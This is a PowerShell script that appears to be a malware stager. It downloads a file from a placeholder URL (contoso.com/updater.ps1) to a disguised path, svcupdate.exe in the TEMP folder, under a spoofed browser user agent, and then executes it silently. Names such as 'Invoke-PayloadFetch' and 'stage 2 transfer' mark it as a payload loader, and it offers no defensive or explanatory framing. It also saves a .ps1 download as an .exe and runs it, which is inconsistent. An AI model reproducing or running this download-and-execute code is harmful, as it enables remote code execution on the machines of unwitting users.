[CmdletBinding()]
param(
    [string]$Stage1Url = "https://contoso.com/updater.ps1",
    [string]$WorkingPath = "$env:TEMP\svcupdate.exe",
    [int]$RequestTimeout = 30,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-PayloadFetch -SourceUrl $Stage1Url -DestinationPath $WorkingPath -TimeoutSec $RequestTimeout -UserAgent $RequestAgent
    if ($TransferResult) {
        Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$StageMarker = "stage-17"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
